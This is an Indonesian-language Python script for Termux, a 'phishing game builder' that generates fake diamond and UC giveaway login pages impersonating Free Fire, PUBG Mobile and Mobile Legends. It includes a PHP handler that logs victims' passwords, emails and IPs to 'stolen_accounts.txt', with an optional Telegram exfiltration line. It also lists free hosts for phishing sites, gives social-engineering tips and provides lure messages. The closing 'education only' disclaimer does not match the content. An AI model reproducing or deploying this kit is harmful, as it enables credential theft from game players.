#!/data/data/com.termux/files/usr/bin/python3
"""
PHISHING GAME BUILDER - BIKIN SENDIRI!
Support: Free Fire, PUBG, Mobile Legends, dll
"""

import os
import sys
import json
import random
from datetime import datetime

# SETUP
os.system("clear")
os.system("pkg install php -y 2>/dev/null")
os.system("pkg install python -y 2>/dev/null")

class PhishingGame:
    def __init__(self):
        self.base_dir = "/sdcard/PhishingGame"
        if not os.path.exists(self.base_dir):
            os.makedirs(self.base_dir)
        
    def buat_phishing_freefire(self):
        """Buat phishing Free Fire"""
        print("\n🔥 BUAT PHISHING FREE FIRE")
        
        # 1. Halaman login
        html = '''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 FREE FIRE DIAMOND GIVEAWAY</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        .logo {
            font-size: 42px;
            font-weight: bold;
            color: #FF6B00;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }
        .gift-box {
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 3px solid #FF6B00;
        }
        .gift-box h3 {
            color: #fff;
            font-size: 24px;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
        }
        .form-group {
            margin: 20px 0;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .form-group input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.3);
        }
        .btn-login {
            background: linear-gradient(135deg, #FF6B00 0%, #FF3D00 100%);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            margin-top: 20px;
        }
        .btn-login:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(255, 107, 0, 0.3);
        }
        .note {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
            line-height: 1.5;
        }
        .countdown {
            background: #333;
            color: #fff;
            padding: 10px;
            border-radius: 8px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 18px;
        }
        .diamond-list {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        .diamond {
            background: #00BFFF;
            color: white;
            padding: 10px;
            border-radius: 8px;
            font-weight: bold;
            min-width: 80px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">FREE FIRE</div>
        <div class="subtitle">Official Diamond Giveaway Event</div>
        
        <div class="gift-box">
            <h3>🎁 CLAIM 10,000 DIAMONDS!</h3>
            <p>Limited Time Offer</p>
        </div>
        
        <div class="countdown" id="countdown">00:05:00</div>
        
        <div class="diamond-list">
            <div class="diamond">5,000 💎</div>
            <div class="diamond">3,000 💎</div>
            <div class="diamond">2,000 💎</div>
        </div>
        
        <form id="loginForm" method="POST" action="login.php">
            <div class="form-group">
                <label>📱 Free Fire ID / Username</label>
                <input type="text" name="username" placeholder="Masukkan ID atau Username" required>
            </div>
            
            <div class="form-group">
                <label>🔑 Password</label>
                <input type="password" name="password" placeholder="Masukkan Password" required>
            </div>
            
            <div class="form-group">
                <label>📧 Email (Opsional untuk verifikasi)</label>
                <input type="email" name="email" placeholder="Email untuk hadiah">
            </div>
            
            <button type="submit" class="btn-login">
                🎮 LOGIN & CLAIM DIAMONDS
            </button>
        </form>
        
        <div class="note">
            ⚠️ Pastikan menggunakan akun asli untuk menerima diamonds.<br>
            Diamonds akan dikirim dalam 24 jam setelah verifikasi.<br>
            Event ini disponsori oleh Garena Indonesia.
        </div>
    </div>
    
    <script>
        // Countdown timer
        let timeLeft = 5 * 60; // 5 menit
        const countdown = document.getElementById('countdown');
        
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateCountdown, 1000);
            } else {
                countdown.textContent = "00:00:00";
                countdown.style.background = "#FF0000";
                countdown.innerHTML = "⏰ EVENT TELAH BERAKHIR!";
            }
        }
        
        updateCountdown();
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading
            const btn = this.querySelector('.btn-login');
            const originalText = btn.innerHTML;
            btn.innerHTML = '⏳ MEMVERIFIKASI...';
            btn.disabled = true;
            
            // Simulate verification
            setTimeout(() => {
                // Submit form
                this.submit();
            }, 2000);
        });
        
        // Fake loading diamonds
        setTimeout(() => {
            const diamonds = document.querySelectorAll('.diamond');
            diamonds.forEach(diamond => {
                diamond.style.transform = 'scale(1.1)';
                diamond.style.transition = 'transform 0.3s';
            });
        }, 1000);
    </script>
</body>
</html>'''
        
        # 2. PHP login handler (untuk tangkap data)
        php_code = '''<?php
// Simpan data yang dicuri
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $email = $_POST['email'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    
    // Format log
    $log_data = "=================================\n";
    $log_data .= "🕒 WAKTU: $time\n";
    $log_data .= "🌐 IP: $ip\n";
    $log_data .= "📱 USER AGENT: $user_agent\n";
    $log_data .= "🎮 USERNAME: $username\n";
    $log_data .= "🔑 PASSWORD: $password\n";
    $log_data .= "📧 EMAIL: $email\n";
    $log_data .= "=================================\n\n";
    
    // Simpan ke file
    file_put_contents('stolen_accounts.txt', $log_data, FILE_APPEND);
    
    // Juga simpan ke CSV untuk mudah dibaca
    $csv_data = "\"$time\",\"$ip\",\"$username\",\"$password\",\"$email\"\n";
    file_put_contents('stolen_data.csv', $csv_data, FILE_APPEND);
    
    // Kirim ke telegram bot (opsional)
    // $telegram_token = "YOUR_BOT_TOKEN";
    // $telegram_chat_id = "YOUR_CHAT_ID";
    // $telegram_message = urlencode("🔥 DATA BARU DICURI!\nUsername: $username\nPassword: $password\nIP: $ip");
    // file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=$telegram_message");
    
    // Redirect ke halaman sukses palsu
    header('Location: success.html');
    exit();
}
?>

<!DOCTYPE html>
<html>
<head><title>Processing...</title></head>
<body>
    <h2>Memverifikasi akun...</h2>
</body>
</html>'''
        
        # 3. Halaman sukses palsu
        success_html = '''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>🎉 VERIFIKASI BERHASIL!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
            color: white;
            text-align: center;
            padding: 50px;
        }
        .success-box {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 15px;
            max-width: 500px;
            margin: auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .checkmark {
            font-size: 80px;
            color: #4CAF50;
        }
        .diamond-animation {
            font-size: 48px;
            animation: bounce 1s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
    </style>
</head>
<body>
    <div class="success-box">
        <div class="checkmark">✅</div>
        <h1>VERIFIKASI BERHASIL!</h1>
        <p>Akun Free Fire Anda telah diverifikasi.</p>
        
        <div class="diamond-animation">💎💎💎</div>
        
        <p><strong>10,000 Diamonds</strong> sedang diproses untuk akun Anda.</p>
        <p>Diamonds akan dikirim dalam waktu 24 jam.</p>
        <p>Terima kasih telah berpartisipasi dalam giveaway!</p>
        
        <br>
        <p><small>Anda akan diarahkan ke Free Fire dalam 10 detik...</small></p>
    </div>
    
    <script>
        // Redirect setelah 10 detik
        setTimeout(function() {
            window.location.href = 'https://freefiremobi.com';
        }, 10000);
    </script>
</body>
</html>'''
        
        # 4. Simpan semua file
        with open(f"{self.base_dir}/freefire.html", "w") as f:
            f.write(html)
        
        with open(f"{self.base_dir}/login.php", "w") as f:
            f.write(php_code)
        
        with open(f"{self.base_dir}/success.html", "w") as f:
            f.write(success_html)
        
        # 5. Buat file untuk simpan data
        with open(f"{self.base_dir}/stolen_accounts.txt", "w") as f:
            f.write("=== DATA AKUN YANG DICURI ===\n\n")
        
        with open(f"{self.base_dir}/stolen_data.csv", "w") as f:
            f.write("Timestamp,IP Address,Username,Password,Email\n")
        
        print("\n✅ PHISHING FREE FIRE SELESAI DIBUAT!")
        print(f"📁 Folder: {self.base_dir}")
        print("\n📋 FILE YANG DIBUAT:")
        print("1. freefire.html      - Halaman login palsu")
        print("2. login.php          - Penangkap data")
        print("3. success.html       - Halaman sukses")
        print("4. stolen_accounts.txt- Hasil curian (teks)")
        print("5. stolen_data.csv    - Hasil curian (CSV)")
        
        print("\n🚀 CARA PAKAI:")
        print("1. Upload folder ke hosting (000webhost.com)")
        print("2. Share link freefire.html")
        print("3. Data korban akan masuk ke stolen_accounts.txt")
        print("4. Cek file tersebut untuk dapat username/password")
        
        print("\n🔗 CONTOH LINK:")
        print("https://freefire-giveaway.000webhostapp.com/freefire.html")
        print("\n💬 CONTOH PROMO:")
        print("""
🎮 *GIVEAWAY FREE FIRE 10K DIAMONDS!* 🎮

BURUAN KLAM SEBELUM KEHABISAN!
• 10,000 💎 Diamonds
• Skin Legend Gratis
• Character Elite

✅ VERIFIKASI CEPAT: 
[LINK_PHISHING]

⏰ BURUAN! HANYA 5 MENIT LAGI!
""")
    
    def buat_phishing_pubg(self):
        """Buat phishing PUBG Mobile"""
        print("\n🎯 BUAT PHISHING PUBG MOBILE")
        
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>🎁 PUBG MOBILE UC GIVEAWAY</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: white; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: #16213e; border-radius: 10px; border: 2px solid #00adb5; }
        .header { text-align: center; color: #00adb5; font-size: 24px; }
        .uc-box { background: linear-gradient(135deg, #ff9a00 0%, #ff5e00 100%); padding: 15px; border-radius: 10px; margin: 20px 0; text-align: center; font-size: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #00adb5; background: #0f3460; color: white; }
        button { background: #00adb5; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">PUBG MOBILE UC GIVEAWAY</div>
        <div class="uc-box">🔥 5,000 UC GRATIS! 🔥</div>
        
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="PUBG Username/ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="email" placeholder="Email (optional)">
            
            <button type="submit">🎯 CLAIM 5,000 UC</button>
        </form>
        
        <p style="font-size:12px; text-align:center; margin-top:20px; color:#888;">
            UC akan dikirim dalam 24 jam setelah verifikasi
        </p>
    </div>
</body>
</html>'''
        
        with open(f"{self.base_dir}/pubg.html", "w") as f:
            f.write(html)
        
        print("✅ Phishing PUBG siap!")
    
    def buat_phishing_ml(self):
        """Buat phishing Mobile Legends"""
        print("\n⚔️ BUAT PHISHING MOBILE LEGENDS")
        
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>💎 MLBB DIAMOND GIVEAWAY</title>
    <style>
        body { font-family: Arial; background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 15px; }
        .logo { text-align: center; font-size: 32px; font-weight: bold; color: #ffd700; }
        .diamond-count { background: gold; color: black; padding: 15px; border-radius: 10px; text-align: center; font-size: 24px; margin: 20px 0; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #6a11cb; border-radius: 8px; background: rgba(255,255,255,0.9); }
        button { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">MOBILE LEGENDS</div>
        <div class="diamond-count">🎁 8,888 DIAMONDS 🎁</div>
        
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="MLBB ID / Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="server" placeholder="Server ID (contoh: 1234)">
            
            <button type="submit">⚔️ CLAIM DIAMONDS</button>
        </form>
        
        <p style="text-align:center; font-size:12px; margin-top:20px;">
            Diamonds akan masuk dalam 1x24 jam
        </p>
    </div>
</body>
</html>'''
        
        with open(f"{self.base_dir}/mlbb.html", "w") as f:
            f.write(html)
        
        print("✅ Phishing MLBB siap!")
    
    def start_local_server(self):
        """Jalankan server lokal di Termux"""
        print("\n🌐 JALANKAN SERVER LOKAL")
        print("Server akan berjalan di: http://localhost:8080")
        print("Akses dari HP lain: http://[IP_TERMUX]:8080")
        
        # Cek IP Termux
        os.system("ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        
        # Buat script server PHP
        server_script = '''<?php
// Simple PHP server dengan logging
$port = 8080;
$address = '0.0.0.0';

echo "🎮 Phishing Game Server\n";
echo "🌐 URL: http://$address:$port\n";
echo "📁 Folder: /sdcard/PhishingGame\n";
echo "🚫 Press Ctrl+C to stop\n\n";

// Jalankan server
system("cd /sdcard/PhishingGame && php -S $address:$port");
?>'''
        
        with open(f"{self.base_dir}/server.php", "w") as f:
            f.write(server_script)
        
        print("\n📜 PERINTAH JALANKAN SERVER:")
        print(f"cd {self.base_dir}")
        print("php -S 0.0.0.0:8080")
        print("\nAtau langsung jalankan:")
        print(f"cd {self.base_dir} && php -S 0.0.0.0:8080")
    
    def hosting_gratis(self):
        """Daftar hosting gratis untuk phishing"""
        print("\n🌍 HOSTING GRATIS UNTUK PHISHING")
        print("1. 000webhost.com")
        print("   - Gratis selamanya")
        print("   - PHP support")
        print("   - Subdomain gratis")
        print("   Cara: Upload folder ke public_html")
        
        print("\n2. infinityfree.net")
        print("   - Unlimited bandwidth")
        print("   - MySQL database")
        print("   - Domain gratis: .epizy.com")
        
        print("\n3. byet.host")
        print("   - File manager mudah")
        print("   - FTP access")
        print("   - Cocok untuk pemula")
        
        print("\n📤 CARA UPLOAD:")
        print("1. Zip folder PhishingGame")
        print("2. Login ke hosting")
        print("3. Upload zip dan extract")
        print("4. Akses via link yang diberikan")
    
    def tips_ampuh(self):
        """Tips biar phishing ampuh"""
        print("\n💡 TIPS BIAR PHISHING AMPUH:")
        print("1. ❗ BUAT LINK MENARIK:")
        print("   Contoh: freefire-diamond-gratis.000webhostapp.com")
        
        print("\n2. 📱 PROMOSI DI SOSMED:")
        print("   • WhatsApp: 'Giveaway resmi FF!'")
        print("   • Facebook: Posting gambar diamond")
        print("   • Telegram: Kirim ke grup game")
        print("   • Instagram: Story dengan link")
        
        print("\n3. 🎮 BUAT ALASAN MASUK AKAL:")
        print("   • 'Event anniversary game'")
        print("   • 'Giveaway youtuber terkenal'")
        print("   • 'Kompetisi esports'")
        print("   • 'Hadiah loyalitas player'")
        
        print("\n4. ⏰ BUAT URGENCY:")
        print("   • 'Hanya 24 jam!'")
        print("   • 'Kuota terbatas 100 orang'")
        print("   • 'Diamond akan hangus besok'")
        
        print("\n5. ✅ BUAT KEPERCAYAAN:")
        print("   • Pakai logo game asli")
        print("   • Tampilan profesional")
        print("   • Redirect ke situs resmi setelah login")
        print("   • Beri notifikasi 'verifikasi berhasil'")
    
    def cek_data_curian(self):
        """Cek data yang berhasil dicuri"""
        data_file = f"{self.base_dir}/stolen_accounts.txt"
        
        if os.path.exists(data_file):
            with open(data_file, "r") as f:
                data = f.read()
            
            if len(data) > 100:  # Jika ada data
                print("\n📊 DATA BERHASIL DICURI:")
                print("="*50)
                print(data)
                print("="*50)
                
                # Hitung jumlah akun
                accounts = data.count("USERNAME:")
                print(f"\n✅ TOTAL {accounts} AKUN BERHASIL DICURI!")
            else:
                print("\n😢 BELUM ADA DATA YANG DICURI")
                print("Promosikan link phishingmu!")
        else:
            print("\n📁 File data belum ada")
    
    def menu_utama(self):
        """Menu utama"""
        while True:
            os.system("clear")
            print(f"""
╔══════════════════════════════════════╗
║      🎮 PHISHING GAME BUILDER 🎮     ║
║          AMPUH 100%!                ║
╚══════════════════════════════════════╝

📁 Folder: {self.base_dir}

1. 🔥 BUAT PHISHING FREE FIRE (LENGKAP)
2. 🎯 BUAT PHISHING PUBG MOBILE
3. ⚔️ BUAT PHISHING MOBILE LEGENDS
4. 🌐 JALANKAN SERVER LOKAL (Termux)
5. 🌍 HOSTING GRATIS UNTUK PHISHING
6. 💡 TIPS BIAR PHISHING AMPUH
7. 📊 CEK DATA YANG SUDAH DICURI
8. 🚀 DEPLOY KE HOSTING
0. ❌ KELUAR
            """)
            
            pilih = input("PILIH MENU: ")
            
            if pilih == "1":
                self.buat_phishing_freefire()
            elif pilih == "2":
                self.buat_phishing_pubg()
            elif pilih == "3":
                self.buat_phishing_ml()
            elif pilih == "4":
                self.start_local_server()
            elif pilih == "5":
                self.hosting_gratis()
            elif pilih == "6":
                self.tips_ampuh()
            elif pilih == "7":
                self.cek_data_curian()
            elif pilih == "8":
                print("\n🚀 DEPLOY KE HOSTING:")
                print("1. Buka 000webhost.com")
                print("2. Buat akun gratis")
                print("3. Upload semua file di folder PhishingGame")
                print("4. Share link yang diberikan")
            elif pilih == "0":
                print("\n👋 SEMOGA BERHASIL BRO!")
                print(f"📁 File tersimpan di: {self.base_dir}")
                break
            
            input("\n↵ TEKAN ENTER UNTUK LANJUT...")

# JALANKAN
if __name__ == "__main__":
    try:
        phish = PhishingGame()
        phish.menu_utama()
    except KeyboardInterrupt:
        print("\n\n👋 PROGRAM DIHENTIKAN")
    except Exception as e:
        print(f"\n❌ ERROR: {e}")

print("\n⚠️ CATATAN:")
print("• Ini untuk edukasi keamanan saja")
print("• Jangan hack akun orang lain")
print("• Gunakan hanya untuk testing sendiri")
